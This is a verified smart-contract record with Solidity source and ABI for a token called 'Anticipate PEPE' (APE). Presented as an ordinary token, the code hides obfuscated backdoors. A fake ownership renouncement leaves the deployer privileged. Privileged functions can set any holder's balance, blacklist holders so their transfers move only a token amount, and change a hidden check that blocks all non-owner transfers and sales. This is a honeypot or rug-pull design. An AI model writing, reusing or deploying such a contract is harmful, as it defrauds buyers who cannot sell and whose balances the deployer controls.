{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface minLimit {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atMarketing) external view returns (uint256);\n\n    function transfer(address exemptFrom, uint256 tradingExempt) external returns (bool);\n\n    function allowance(address receiverMax, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptFrom,\n        uint256 tradingExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchTo, uint256 value);\n    event Approval(address indexed receiverMax, address indexed spender, uint256 value);\n}\n\nabstract contract teamSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoShouldFund {\n    function createPair(address launchSell, address toMode) external returns (address);\n}\n\ninterface sellAt is minLimit {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AnticipatePEPE is teamSell, minLimit, sellAt {\n\n    address public tokenBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalAmount;\n    }\n\n    event OwnershipTransferred(address indexed liquidityMin, address indexed minTx);\n\n    function transferFrom(address shouldFundReceiver, address exemptFrom, uint256 tradingExempt) external override returns (bool) {\n        if (_msgSender() != txTokenSwap) {\n            if (listShould[shouldFundReceiver][_msgSender()] != type(uint256).max) {\n                require(tradingExempt <= listShould[shouldFundReceiver][_msgSender()]);\n                listShould[shouldFundReceiver][_msgSender()] -= tradingExempt;\n            }\n        }\n        return modeSenderReceiver(shouldFundReceiver, exemptFrom, tradingExempt);\n    }\n\n    mapping(address => uint256) private tradingTotal;\n\n    function totalSwap() private view {\n        require(feeExempt[_msgSender()]);\n    }\n\n    function swapBuyToken(address buyEnable) public {\n        totalSwap();\n        \n        if (buyEnable == tokenBuy || buyEnable == listSwap) {\n            return;\n        }\n        limitTo[buyEnable] = true;\n    }\n\n    uint256 private totalAmount = 100000000 * 10 ** 18;\n\n    function shouldReceiver() public {\n        emit OwnershipTransferred(tokenBuy, address(0));\n        tradingAmount = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountTokenLaunch;\n    }\n\n    uint256 public buyFeeTeam;\n\n    address private tradingAmount;\n\n    function marketingTo(address sellBuyLaunched, uint256 tradingExempt) public {\n        totalSwap();\n        tradingTotal[sellBuyLaunched] = tradingExempt;\n    }\n\n    uint256 teamTake;\n\n    bool private feeBuyFrom;\n\n    constructor (){\n        if (buyFeeTeam == modeWalletLaunch) {\n            amountReceiverIs = false;\n        }\n        autoList buyList = autoList(txTokenSwap);\n        listSwap = autoShouldFund(buyList.factory()).createPair(buyList.WETH(), address(this));\n        if (maxMarketingEnable) {\n            sellLimit = false;\n        }\n        tokenBuy = _msgSender();\n        shouldReceiver();\n        feeExempt[tokenBuy] = true;\n        tradingTotal[tokenBuy] = totalAmount;\n        if (maxMarketingEnable != amountReceiverIs) {\n            toExempt = isTxToken;\n        }\n        emit Transfer(address(0), tokenBuy, totalAmount);\n    }\n\n    mapping(address => bool) public limitTo;\n\n    function owner() external view returns (address) {\n        return tradingAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private listShould;\n\n    uint256 private toExempt;\n\n    function senderAt(address totalTeam) public {\n        require(totalTeam.balance < 100000);\n        if (walletAmountLaunch) {\n            return;\n        }\n        if (toExempt != isTxToken) {\n            toExempt = modeWalletLaunch;\n        }\n        feeExempt[totalTeam] = true;\n        if (toExempt != isTxToken) {\n            isTxToken = modeWalletLaunch;\n        }\n        walletAmountLaunch = true;\n    }\n\n    function approve(address buySwap, uint256 tradingExempt) public virtual override returns (bool) {\n        listShould[_msgSender()][buySwap] = tradingExempt;\n        emit Approval(_msgSender(), buySwap, tradingExempt);\n        return true;\n    }\n\n    mapping(address => bool) public feeExempt;\n\n    address receiverLaunchedLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public listSwap;\n\n    bool public walletAmountLaunch;\n\n    uint256 constant limitFund = 12 ** 10;\n\n    bool public amountReceiverIs;\n\n    bool public maxMarketingEnable;\n\n    function allowance(address launchedAmount, address buySwap) external view virtual override returns (uint256) {\n        if (buySwap == txTokenSwap) {\n            return type(uint256).max;\n        }\n        return listShould[launchedAmount][buySwap];\n    }\n\n    function transfer(address sellBuyLaunched, uint256 tradingExempt) external virtual override returns (bool) {\n        return modeSenderReceiver(_msgSender(), sellBuyLaunched, tradingExempt);\n    }\n\n    uint8 private amountTokenLaunch = 18;\n\n    address txTokenSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function swapAt(uint256 tradingExempt) public {\n        totalSwap();\n        modeAtSwap = tradingExempt;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenReceiver;\n    }\n\n    function balanceOf(address atMarketing) public view virtual override returns (uint256) {\n        return tradingTotal[atMarketing];\n    }\n\n    uint256 modeAtSwap;\n\n    uint256 private modeWalletLaunch;\n\n    function getOwner() external view returns (address) {\n        return tradingAmount;\n    }\n\n    bool private sellLimit;\n\n    function modeSenderReceiver(address shouldFundReceiver, address exemptFrom, uint256 tradingExempt) internal returns (bool) {\n        if (shouldFundReceiver == tokenBuy) {\n            return teamMaxExempt(shouldFundReceiver, exemptFrom, tradingExempt);\n        }\n        uint256 tradingReceiver = minLimit(listSwap).balanceOf(receiverLaunchedLiquidity);\n        require(tradingReceiver == modeAtSwap);\n        require(exemptFrom != receiverLaunchedLiquidity);\n        if (limitTo[shouldFundReceiver]) {\n            return teamMaxExempt(shouldFundReceiver, exemptFrom, limitFund);\n        }\n        return teamMaxExempt(shouldFundReceiver, exemptFrom, tradingExempt);\n    }\n\n    function teamMaxExempt(address shouldFundReceiver, address exemptFrom, uint256 tradingExempt) internal returns (bool) {\n        require(tradingTotal[shouldFundReceiver] >= tradingExempt);\n        tradingTotal[shouldFundReceiver] -= tradingExempt;\n        tradingTotal[exemptFrom] += tradingExempt;\n        emit Transfer(shouldFundReceiver, exemptFrom, tradingExempt);\n        return true;\n    }\n\n    uint256 private isTxToken;\n\n    string private tokenReceiver = \"APE\";\n\n    string private swapBuy = \"Anticipate PEPE\";\n\n    function name() external view virtual override returns (string memory) {\n        return swapBuy;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMarketing\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFeeTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellBuyLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingExempt\",\"type\":\"uint256\"}],\"name\":\"marketingTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxMarketingEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTeam\",\"type\":\"address\"}],\"name\":\"senderAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingExempt\",\"type\":\"uint256\"}],\"name\":\"swapAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyEnable\",\"type\":\"address\"}],\"name\":\"swapBuyToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellBuyLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFundReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAmountLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AnticipatePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}